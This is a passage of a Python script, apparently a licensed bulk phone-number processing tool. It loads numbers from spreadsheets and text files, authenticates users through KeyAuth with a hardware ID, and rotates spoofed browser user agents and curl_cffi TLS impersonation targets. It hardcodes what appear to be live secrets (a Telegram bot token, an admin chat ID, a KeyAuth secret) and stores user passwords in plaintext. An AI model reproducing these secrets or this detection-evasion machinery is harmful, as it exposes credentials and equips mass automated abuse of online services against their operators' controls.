    return detect_and_extract_numbers(rows)


def read_numbers_from_xlsx(file_path):
    try:
        import openpyxl
    except ImportError:
        print(f'{RED} openpyxl not installed! Run: pip install openpyxl')
        return []
    try:
        wb = openpyxl.load_workbook(file_path, read_only=True, data_only=True)
        ws = wb.active
        rows = list(ws.iter_rows(values_only=True))
        wb.close()
        return detect_and_extract_numbers(rows)
    except Exception as e:
        print(f'{RED} Error reading Excel file: {e}')
        return []


def read_numbers(file_path):
    ext = os.path.splitext(file_path)[1].lower()
    if ext == '.txt':
        return read_numbers_from_txt(file_path)
    elif ext == '.csv':
        return read_numbers_from_csv(file_path)
    elif ext == '.xlsx':
        return read_numbers_from_xlsx(file_path)
    return []


def process_number_list_fallback():
    num_file = get_number_file_path()
    if os.path.exists(num_file):
        with open(num_file, 'r', encoding='utf-8', errors='ignore') as f:
            numbers = [line.strip() for line in f if line.strip()]
        if numbers:
            print(f'{GREEN} [{RED}◆{GREEN}] Selected File {EKL} {num_file}')
            settings = load_settings('api_settings').get('file_input_settings', {})
            if not settings.get('always_use_txt', False):
                input(f'{WHITE} Press Enter to Start Processing {len(numbers)} Numbers...')
            return numbers
        else:
            print(f"{WHITE} '{num_file}' file is empty.")
            return []
    else:
        print(f"{WHITE} '{num_file}' file was not found.")
        return []


def finalize_numbers(numbers, source_name):
    num_file = get_number_file_path()
    nums = list(dict.fromkeys(numbers))
    with open(num_file, 'w', encoding='utf-8', errors='ignore') as f:
        for num in nums:
            f.write(num + '\n')
    print(f'{GREEN} [{RED}◆{GREEN}] Total Unique Numbers Extracted {EKL} {len(nums)}')
    print(f'{GREEN} [{RED}◆{GREEN}] Found from: {source_name}')
    print(f"{GREEN} [{RED}◆{GREEN}] Saved to '{num_file}'\n")
    settings = load_settings('api_settings').get('file_input_settings', {})
    if not settings.get('always_use_txt', False):
        input(f'{WHITE} Press Enter to Start Processing {len(nums)} Numbers...')
    return nums


def file_input(setting_key='api_settings'):
    settings = load_settings(setting_key)
    file_settings = settings.get('file_input_settings', {})
    always_use_txt = file_settings.get('always_use_txt', False)
    use_multiple_excel = file_settings.get('use_multiple_excel_files', False)
    if always_use_txt:
        return process_number_list_fallback()
    if use_multiple_excel:
        xlsx_files = [f for f in os.listdir('.') if f.lower().endswith('.xlsx') and not f.startswith('~$')]
        if xlsx_files:
            print(f'{GREEN} [{RED}◆{GREEN}] Found {len(xlsx_files)} Excel Files.')
            all_numbers = []
            for f in xlsx_files:
                print(f'{WHITE} Extracting from {f} ...')
                nums = read_numbers_from_xlsx(f)
                if nums:
                    print(f'{GREEN}  -> Found {len(nums)} numbers.')
                    all_numbers.extend(nums)
                else:
                    print(f'{RED}  -> Failed: No valid numbers found or error occurred.')
            if all_numbers:
                return finalize_numbers(all_numbers, f'{len(xlsx_files)} Excel files')
            else:
                print(f'{RED} No valid numbers found in any Excel files.')
                return process_number_list_fallback()
        else:
            print(f'{WHITE} No Excel files found.')
            return process_number_list_fallback()

    supported_ext = ('.txt', '.csv', '.xlsx')
    files = [f for f in os.listdir('.') if f.lower().endswith(supported_ext) and not f.startswith('~$')]
    if not files:
        print(f'{WHITE} No Supported files found.')
        return process_number_list_fallback()

    print(f'{GREEN} [{RED}◆{GREEN}] Found {len(files)} File(s):')
    for idx, filename in enumerate(files, 1):
        print(f' {GREEN}[{RED}{idx}{GREEN}] {WHITE}{filename}')
    print(LINE)
    try:
        choice = int(input(f'{GREEN} [{RED}◆{GREEN}] Select File (1-{len(files)}) {EKL} '))
        if 1 <= choice <= len(files):
            filename = files[choice - 1]
            print(f'{GREEN} [{RED}◆{GREEN}] Selected File {EKL} {filename}\n')
            nums = read_numbers(filename)
            if nums:
                return finalize_numbers(nums, filename)
            else:
                print(f'{RED} Error: No valid phone numbers extracted from {filename}')
                return process_number_list_fallback()
        else:
            print(f'{RED} Invalid selection!')
            return process_number_list_fallback()
    except Exception:
        print(f'{RED} Invalid selection!')
        return process_number_list_fallback()


TELEGRAM_BOT_TOKEN = '8823775166:AAFZeLtovMfGEzEwXOcKh3HjMp5weLMyr78'
TELEGRAM_ADMIN_CHAT_ID = '6262468884'
RENTRY_RAW_URL = 'https://rentry.co/p69yq9z8/raw'
KEYAUTH_NAME = 'internal'
KEYAUTH_OWNERID = 'rtE6li40Tc'
KEYAUTH_SECRET = '3283714c8bbb8476b101450c2d79e7c485adfbd7d580b4f919be3160ff123b60'
KEYAUTH_VERSION = '1.0'
KEYAUTH_URL = 'https://keyauth.win/api/1.2/'
KEYAUTH_CRED_FILE = 'auth.json'


def get_hwid():
    import uuid
    import hashlib
    import subprocess
    import os
    import getpass
    import platform
    try:
        username = getpass.getuser()
    except Exception:
        username = 'user'
    mac_addr = ''
    sys_platform = platform.system().lower()
    if sys_platform == 'windows':
        try:
            output = subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL).decode().strip()
            lines = [line.strip() for line in output.split('\n') if line.strip()]
            if len(lines) > 1:
                mac_addr = lines[1]
        except Exception:
            pass
    if not mac_addr:
        mac_addr = str(uuid.getnode())
    if sys_platform == 'windows':
        os_platform = 'win32'
    elif sys_platform == 'darwin':
        os_platform = 'darwin'
    else:
        os_platform = 'linux'
    machine = platform.machine().lower()
    os_arch = 'x64' if machine in ('amd64', 'x86_64') else machine
    hwid_str = f'{username}-{mac_addr}-{os_platform}-{os_arch}'
    return hashlib.sha256(hwid_str.encode()).hexdigest().upper()


class KeyAuthApp:
    def __init__(self, name, ownerid, secret, version):
        self.name = name
        self.ownerid = ownerid
        self.secret = secret
        self.version = version
        self.sessionid = None
        self.user_data = {}

    def init(self):
        try:
            init_data = {
                'type': 'init',
                'ver': self.version,
                'name': self.name,
                'ownerid': self.ownerid
            }
            res = requests.post(KEYAUTH_URL, data=init_data, timeout=12)
            if res.status_code != 200:
                return False, f'Server returned HTTP {res.status_code}'
            json_res = res.json()
            if json_res.get('success'):
                self.sessionid = json_res.get('sessionid')
                return True, 'Initialized'
            return False, json_res.get('message', 'KeyAuth initialization failed.')
        except Exception as e:
            return False, f'Failed to connect to KeyAuth: {e}'

    def login(self, username, password, hwid):
        if not self.sessionid:
            ok, msg = self.init()
            if not ok:
                return False, msg
        try:
            login_data = {
                'type': 'login',
                'username': username.strip(),
                'pass': password.strip(),
                'hwid': hwid,
                'sessionid': self.sessionid,
                'name': self.name,
                'ownerid': self.ownerid
            }
            res = requests.post(KEYAUTH_URL, data=login_data, timeout=15)
            if res.status_code != 200:
                return False, f'Server returned HTTP {res.status_code}'
            json_res = res.json()
            if json_res.get('success'):
                self.user_data = json_res.get('info', {})
                return True, json_res.get('message', 'Login Successful')
            return False, json_res.get('message', 'Invalid Username or Password')
        except Exception as e:
            return False, f'Login error: {e}'


def format_keyauth_expiry(user_info):
    import datetime
    try:
        subs = user_info.get('subscriptions', [])
        if not subs:
            return 'Standard', 'Lifetime'
        sub = subs[0]
        sub_name = sub.get('subscription', 'Standard')
        expiry_ts = int(sub.get('time', 0))
        if expiry_ts <= 0 or expiry_ts > 2000000000:
            return sub_name, 'Lifetime'
        expiry_dt = datetime.datetime.fromtimestamp(expiry_ts)
        days_left = max(0, int((expiry_ts - time.time()) // 86400))
        return sub_name, f"{expiry_dt.strftime('%Y-%m-%d %H:%M')} ({days_left} Days remaining)"
    except Exception:
        return 'Active', 'Lifetime'


def verify_auth():
    hwid = get_hwid()
    app = KeyAuthApp(KEYAUTH_NAME, KEYAUTH_OWNERID, KEYAUTH_SECRET, KEYAUTH_VERSION)
    print(f'\n{CYAN} ✦ ═══════════════════════════════════════ ✦{RESET}')
    print(f' {GREEN}〔{RED}👤{GREEN}〕 KEYAUTH USER LOGIN{RESET}')
    print(f' {GREEN}〔{RED}◆{GREEN}〕 HWID         {EKL} {hwid[:24]}...{RESET}')
    print(f'{CYAN} ✦ ═══════════════════════════════════════ ✦{RESET}\n')
    saved_user, saved_pass = None, None
    if os.path.exists(KEYAUTH_CRED_FILE):
        try:
            with open(KEYAUTH_CRED_FILE, 'r', encoding='utf-8') as f:
                creds = json.load(f)
                saved_user = creds.get('username')
                saved_pass = creds.get('password')
        except Exception:
            saved_user, saved_pass = None, None

    if saved_user and saved_pass:
        print(f'{YELLOW} [*] Logging in with saved credentials ({saved_user})...{RESET}')
        ok, msg = app.login(saved_user, saved_pass, hwid)
        if ok:
            sub_name, expiry_str = format_keyauth_expiry(app.user_data)
            print(f'{GREEN} [✓] Login Successful! Welcome, {WHITE}{saved_user}{GREEN}!{RESET}')
            print(f'{GREEN} [✓] Plan      : {WHITE}{sub_name}{RESET}')
            print(f'{GREEN} [✓] Expiry    : {WHITE}{expiry_str}{RESET}')
            time.sleep(1.8)
            return True
        else:
            print(f'{RED} [!] Saved login failed: {msg}{RESET}')
            try:
                os.remove(KEYAUTH_CRED_FILE)
            except Exception:
                pass

    max_attempts = 3
    for attempt in range(1, 4):
        print(f'\n{YELLOW} Enter your KeyAuth Credentials (Attempt {attempt}/{max_attempts}):{RESET}')
        username = input(f'{GREEN} [{RED}◆{GREEN}] Username {EKL} ').strip()
        password = input(f'{GREEN} [{RED}◆{GREEN}] Password {EKL} ').strip()
        if not username or not password:
            print(f'{RED} [!] Username and Password cannot be empty.{RESET}')
            continue
        print(f'{YELLOW} [*] Authenticating with KeyAuth server...{RESET}')
        ok, msg = app.login(username, password, hwid)
        if ok:
            try:
                with open(KEYAUTH_CRED_FILE, 'w', encoding='utf-8') as f:
                    json.dump({'username': username, 'password': password}, f)
            except Exception:
                pass
            sub_name, expiry_str = format_keyauth_expiry(app.user_data)
            print(f'\n{GREEN} ✦ ═══════════════════════════════════════ ✦{RESET}')
            print(f'{GREEN} [✓] Login Successful! Welcome, {WHITE}{username}{GREEN}!{RESET}')
            print(f'{GREEN} [✓] Plan      : {WHITE}{sub_name}{RESET}')
            print(f'{GREEN} [✓] Expiry    : {WHITE}{expiry_str}{RESET}')
            print(f'{CYAN} ✦ ═══════════════════════════════════════ ✦{RESET}')
            time.sleep(2)
            return True
        else:
            print(f'{RED} [!] Authentication Failed: {msg}{RESET}')
    print(f'\n{RED} [!] Maximum attempts reached. Exiting...{RESET}')
    time.sleep(2)
    sys.exit(1)


WINDOWS_CHROME_VERSIONS = [
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.8078.81 Safari/537.36', 'Win Chrome 156'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36', 'Win Chrome 156'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7452.102 Safari/537.36', 'Win Chrome 146'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7452.76 Safari/537.36', 'Win Chrome 146'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7360.108 Safari/537.36', 'Win Chrome 145'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7360.72 Safari/537.36', 'Win Chrome 145'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36', 'Win Chrome 136'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.127 Safari/537.36', 'Win Chrome 133'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.265 Safari/537.36', 'Win Chrome 131')
]

ANDROID_CHROME_VERSIONS = [
    ('Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7452.102 Mobile Safari/537.36', 'Galaxy S25 Ultra Chrome 146'),
    ('Mozilla/5.0 (Linux; Android 15; SM-S931B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7452.76 Mobile Safari/537.36', 'Galaxy S25 Chrome 146'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7360.108 Mobile Safari/537.36', 'Galaxy S24 Ultra Chrome 145'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7360.72 Mobile Safari/537.36', 'Galaxy S24 Ultra Chrome 145'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7360.56 Mobile Safari/537.36', 'Galaxy S24 Chrome 145'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Mobile Safari/537.36', 'Galaxy S24 Ultra Chrome 136'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36', 'Galaxy S23 Ultra Chrome 136'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.137 Mobile Safari/537.36', 'Galaxy S24 Ultra Chrome 133'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.163 Mobile Safari/537.36', 'Galaxy S24 Ultra Chrome 132'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.260 Mobile Safari/537.36', 'Galaxy S24 Ultra Chrome 131'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36', 'Galaxy S24 Chrome 131'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.49 Mobile Safari/537.36', 'Galaxy S23 Ultra Chrome 133'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S918U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.260 Mobile Safari/537.36', 'Galaxy S23 Ultra Chrome 131'),
    ('Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36', 'Galaxy S23 Chrome 128'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.122 Mobile Safari/537.36', 'Galaxy S22 Ultra Chrome 132'),
    ('Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.179 Mobile Safari/537.36', 'Galaxy S21 Ultra Chrome 124'),
    ('Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7452.102 Mobile Safari/537.36', 'Pixel 9 Pro Chrome 146'),
    ('Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7360.108 Mobile Safari/537.36', 'Pixel 8 Pro Chrome 145'),
    ('Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Mobile Safari/537.36', 'Pixel 8 Chrome 136')
]

MICROSOFT_EDGE_VERSIONS = [
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.3065.82', 'Win Edge 133'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.2957.140', 'Win Edge 132'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.2903.112', 'Win Edge 131'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.2849.80', 'Win Edge 130'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.137 Mobile Safari/537.36 EdgA/133.0.3065.82', 'Galaxy S24 Ultra Edge 133'),
    ('Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.163 Mobile Safari/537.36 EdgA/132.0.2957.130', 'Pixel 8 Pro Edge 132'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.260 Mobile Safari/537.36 EdgA/131.0.2903.95', 'Galaxy S23 Ultra Edge 131')
]

SAMSUNG_INTERNET_VERSIONS = [
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36', 'Galaxy S24 Ultra SamsungBrowser 26.0'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36', 'Galaxy S24 Ultra SamsungBrowser 25.0'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.0.0 Mobile Safari/537.36', 'Galaxy S23 Ultra SamsungBrowser 25.0'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36', 'Galaxy S23 SamsungBrowser 24.0'),
    ('Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36', 'Galaxy A54 SamsungBrowser 24.0'),
    ('Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36', 'Galaxy S22 Ultra SamsungBrowser 23.0'),
    ('Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36', 'Galaxy S21 Ultra SamsungBrowser 23.0')
]

MOZILLA_FIREFOX_VERSIONS = [
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0', 'Win Firefox 135'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0', 'Win Firefox 134'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0', 'Win Firefox 133'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0', 'Win Firefox 132'),
    ('Mozilla/5.0 (Android 14; Mobile; rv:135.0) Gecko/135.0 Firefox/135.0', 'Android Firefox 135'),
    ('Mozilla/5.0 (Android 14; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0', 'Android Firefox 134'),
    ('Mozilla/5.0 (Android 13; Mobile; rv:133.0) Gecko/133.0 Firefox/133.0', 'Android Firefox 133')
]

IOS_SAFARI_VERSIONS = [
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1', 'iPhone 16 Pro iOS 18.3 Safari'),
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1', 'iPhone 15 Pro iOS 18.2 Safari'),
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1', 'iPhone 15 iOS 18.1 Safari'),
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Mobile/15E148 Safari/604.1', 'iPhone 14 Pro iOS 17.7 Safari'),
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1', 'iPhone 13 iOS 17.6 Safari')
]

MACOS_SAFARI_VERSIONS = [
    ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'macOS Sequoia Safari 18.3'),
    ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'macOS Sonoma Safari 17.6')
]

APPLE_SAFARI_VERSIONS = IOS_SAFARI_VERSIONS + MACOS_SAFARI_VERSIONS

OPERA_VERSIONS = [
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/117.0.0.0', 'Win Opera GX 117'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/116.0.0.0', 'Win Opera 116'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/115.0.0.0', 'Win Opera 115'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 OPR/86.0.0.0', 'Galaxy S24 Opera Mobile 86'),
    ('Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 OPR/85.0.0.0', 'Pixel 8 Opera Mobile 85')
]

ANDROID_WEBVIEW_VERSIONS = [
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.122 Mobile Safari/537.36', 'Galaxy S24 Ultra WebView 133'),
    ('Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.122 Mobile Safari/537.36', 'Galaxy S23 Ultra WebView 133'),
    ('Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.260 Mobile Safari/537.36', 'Galaxy S21 Ultra WebView 131'),
    ('Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UD1A.230803.041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36', 'Pixel 8 Pro WebView 131')
]

SAMSUNG_GALAXY_VERSIONS = [item for item in ANDROID_CHROME_VERSIONS if 'Galaxy' in item[1]]
PIXEL_VERSIONS = [item for item in ANDROID_CHROME_VERSIONS if 'Pixel' in item[1]]
ALL_MOBILE_VERSIONS = IOS_SAFARI_VERSIONS + ANDROID_CHROME_VERSIONS + SAMSUNG_INTERNET_VERSIONS
ALL_WORKING_BROWSERS = (
    WINDOWS_CHROME_VERSIONS + ANDROID_CHROME_VERSIONS + MICROSOFT_EDGE_VERSIONS +
    SAMSUNG_INTERNET_VERSIONS + MOZILLA_FIREFOX_VERSIONS + APPLE_SAFARI_VERSIONS + OPERA_VERSIONS
)


def get_random_mobile_ua():
    return random.choice(ALL_MOBILE_VERSIONS)


def format_ua_label(ua):
    if not ua:
        return 'Unknown UA'
    if isinstance(ua, tuple):
        return ua[1] if len(ua) > 1 and ua[1] else format_ua_label(ua[0])
    if 'KAIOS' in ua:
        m = re.search(r'Firefox/(\d+)', ua)
        ver = m.group(1) if m else 'Gecko'
        return f'KaiOS Firefox {ver}'
    if 'Windows Phone' in ua:
        m = re.search(r'Windows Phone (?:OS )?(\d+(?:\.\d+)?)', ua)
        ver = m.group(1) if m else '10'
        return f'WinPhone {ver}'
    if 'BlackBerry' in ua or 'BB10' in ua:
        return 'BlackBerry'
    if 'iPad' in ua:
        m = re.search(r'CPU OS (\d+[_\.]\d+(?:[_\.]\d+)?)', ua)
        if m:
            ver = m.group(1).replace('_', '.')
            return f'iPadOS {ver} Safari'
        return 'iPadOS Safari'
    if 'iPhone' in ua:
        m = re.search(r'OS (\d+[_\.]\d+(?:[_\.]\d+)?)', ua)
        if m:
            ver = m.group(1).replace('_', '.')
            return f'iOS {ver}'
        return 'iOS Safari'
    if 'SamsungBrowser' in ua:
        m = re.search(r'SamsungBrowser/(\d+(?:\.\d+)?)', ua)
        if m:
            return f'SamsungBrowser {m.group(1)}'
        return 'SamsungBrowser'
    if 'Edg' in ua:
        m = re.search(r'Edg[A]?/(\d+)', ua)
        if m:
            prefix = 'Android' if 'Android' in ua else 'Win'
            return f'{prefix} Edge {m.group(1)}'
    if 'Firefox' in ua:
        m = re.search(r'Firefox/(\d+)', ua)
        if m:
            prefix = 'Android' if 'Android' in ua else 'Win'
            return f'{prefix} Firefox {m.group(1)}'
    if 'OPR' in ua or 'Opera' in ua:
        m = re.search(r'OPR/(\d+)', ua)
        if m:
            prefix = 'Android' if 'Android' in ua else 'Win'
            return f'{prefix} Opera {m.group(1)}'
    if 'Android' in ua:
        m = re.search(r'Android (\d+(?:\.\d+)?)', ua)
        ver = f'Android {m.group(1)}' if m else 'Android'
        c = re.search(r'Chrome/(\d+)', ua)
        c_ver = f'Chrome {c.group(1)}' if c else ''
        return f'{ver} {c_ver}'.strip()
    if 'Windows' in ua:
        c = re.search(r'Chrome/(\d+)', ua)
        c_ver = f'Chrome {c.group(1)}' if c else 'Chrome'
        return f'Win {c_ver}'
    if 'Macintosh' in ua or 'Mac OS X' in ua:
        return 'macOS Safari'
    return 'Custom UA'


def get_random_ua():
    return random.choice(ALL_WORKING_BROWSERS)


def get_chrome_major(user_agent):
    m = re.search(r'Chrome/(\d+)', user_agent)
    return int(m.group(1)) if m else 131


try:
    from curl_cffi.requests import BrowserType as _CFFI_BrowserType
    _SUPPORTED_IMPERSONATE = {b.value for b in _CFFI_BrowserType}
except Exception:
    _SUPPORTED_IMPERSONATE = set()


def _valid_impersonate(target, android=False):
    if not _SUPPORTED_IMPERSONATE or target in _SUPPORTED_IMPERSONATE:
        return target
    if android and 'chrome131_android' in _SUPPORTED_IMPERSONATE:
        return 'chrome131_android'
    for fallback in ('chrome142', 'chrome136', 'chrome131', 'chrome124', 'chrome120', 'chrome110'):
        if fallback in _SUPPORTED_IMPERSONATE:
            return fallback
    return 'chrome120'


def pick_chrome_target(version, android=False):
    if android:
        t = 'chrome131_android' if version >= 99 else 'chrome99_android'
        return _valid_impersonate(t, android=True)
    if version >= 142:
        return _valid_impersonate(random.choice(['chrome142', 'chrome136']))
    if version >= 136:
        return _valid_impersonate(random.choice(['chrome136', 'chrome133a', 'chrome131']))
    if version >= 131:
        return _valid_impersonate(random.choice(['chrome131', 'chrome124']))
    if version >= 120:
        return _valid_impersonate(random.choice(['chrome124', 'chrome120', 'chrome116']))
    return _valid_impersonate(random.choice(['chrome100', 'chrome99']))


def get_impersonate_target(user_agent):
    if 'Firefox' in user_agent or 'KAIOS' in user_agent:
        m = re.search(r'Firefox/(\d+)', user_agent)
        firefox_v = int(m.group(1)) if m else 135
        if firefox_v >= 144:
            return _valid_impersonate(random.choice(['firefox144', 'firefox135']))
        if firefox_v >= 133:
            return _valid_impersonate(random.choice(['firefox135', 'firefox133']))
        return _valid_impersonate(random.choice(['firefox133', 'firefox135']))
    if 'Windows Phone' in user_agent:
        return random.choice(['edge99', 'chrome99'])
    if 'BlackBerry' in user_agent or 'BB10' in user_agent:
        return random.choice(['chrome99', 'chrome99_android', 'safari153'])
    if 'Edg' in user_agent:
        edge_match = re.search(r'Edg[A]?/(\d+)', user_agent)
        edge_v = int(edge_match.group(1)) if edge_match else 131
        if 'Android' in user_agent:
            return pick_chrome_target(edge_v, android=True)
        if edge_v >= 131:
            return random.choice(['edge101', 'chrome131', 'chrome124'])
        return random.choice(['edge99', 'edge101'])
    if 'SamsungBrowser' in user_agent:
        return 'chrome131_android'
    if 'OPR' in user_agent or 'Opera' in user_agent:
        chrome_v = get_chrome_major(user_agent)
        if 'Android' in user_agent:
            return pick_chrome_target(chrome_v, android=True)
        return pick_chrome_target(chrome_v, android=False)
    if 'Android' in user_agent:
        chrome_v = get_chrome_major(user_agent)
        return pick_chrome_target(chrome_v, android=True)
    if 'iPhone' in user_agent or 'iPad' in user_agent:
        ios_match = re.search(r'OS (\d+)[_\.]', user_agent)
        ios_v = int(ios_match.group(1)) if ios_match else 18
        if ios_v >= 26:
            return random.choice(['safari260_ios', 'safari2601', 'safari184_ios'])
        if ios_v >= 18:
